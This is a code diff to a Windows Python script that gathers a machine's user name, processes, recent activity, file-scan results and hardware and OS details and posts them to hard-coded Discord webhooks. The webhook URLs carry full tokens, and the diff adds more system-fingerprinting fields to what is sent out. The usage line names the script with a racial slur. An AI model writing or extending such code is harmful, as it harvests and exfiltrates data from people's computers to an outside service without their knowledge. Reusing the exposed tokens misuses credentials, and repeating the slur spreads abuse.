@@ -7,6 +7,7 @@ import platform
 import getpass
 import win32clipboard
 import tempfile
+import psutil
 from datetime import datetime
 
 # Webhook URLs
@@ -18,9 +19,6 @@ WEBHOOK_URLS = {
     'recent_activity': 'https://canary.discord.com/api/webhooks/1279411390314057820/85pPrwRUCeX3EoLCexlHK0LOyAf9m9pRmRO3GIgZZMhMdm_gxAbMLWSE_0T6MXNhiWgK',
     'error': 'https://canary.discord.com/api/webhooks/1279188293438799902/S3ejH4YpQBv-7Yp4TfW8LCezK-UpzVxolIwdcX66uN-DQZ2DiXt-X2QdeL2mM9ky5Siz'
 }
-
-# Webhook delay (in seconds)
-WEBHOOK_DELAY = 1
 
 def send_embed_to_webhook(title, description, color, url):
     """Send a message to the webhook with an embedded format."""
@@ -201,6 +199,7 @@ def scan_recent_activity():
 
 def scan_pc(specific_files=None):
     """Scan the entire PC, checking directories for specific files."""
+    global log_file
     log_file = tempfile.mktemp(suffix=".log", dir=tempfile.gettempdir())
     results = {}
     total_files = 0
@@ -241,7 +240,11 @@ def get_system_information():
         'User': getpass.getuser(),
         'CPU Usage': f"{psutil.cpu_percent()}%",
         'Memory Info': f"Total: {psutil.virtual_memory().total / (1024 ** 3):.2f} GB, Available: {psutil.virtual_memory().available / (1024 ** 3):.2f} GB",
-        'Disk Usage': f"Total: {psutil.disk_usage('/').total / (1024 ** 3):.2f} GB, Used: {psutil.disk_usage('/').used / (1024 ** 3):.2f} GB"
+        'Disk Usage': f"Total: {psutil.disk_usage('/').total / (1024 ** 3):.2f} GB, Used: {psutil.disk_usage('/').used / (1024 ** 3):.2f} GB",
+        'Windows Version': platform.version(),
+        'Machine Type': platform.machine(),
+        'Platform': platform.platform(),
+        'Processor Arch': platform.architecture()
     }
     info_str = "\n".join([f"{key}: {value}" for key, value in system_info.items()])
     send_embed_to_webhook(
@@ -254,13 +257,13 @@ def get_system_information():
 
 def main():
     print_status("Starting script...", 'normal')
-    choice = input("Enter your choice (1-6): ")
-    while choice not in ['1', '2', '3', '4', '5', '6']:
-        print_status("Invalid choice. Please select a valid option.", 'error')
-        choice = input("Enter your choice (1-6): ")
+    if len(sys.argv) < 3:
+        print_status("Usage: python niggatool.py <option> <delay>", 'error')
+        return
 
+    choice = sys.argv[1]
     global WEBHOOK_DELAY
-    WEBHOOK_DELAY = int(input("Enter webhook delay in seconds: "))
+    WEBHOOK_DELAY = int(sys.argv[2])
 
     if choice == '1':
         processes = get_processes()
@@ -279,7 +282,6 @@ def main():
         )
     elif choice == '2':
         # Implement database search functionality here
-        # Ensure all relevant information is gathered and reported
         send_embed_to_webhook(
             "Database Search Results",
             "Database search results go here.",
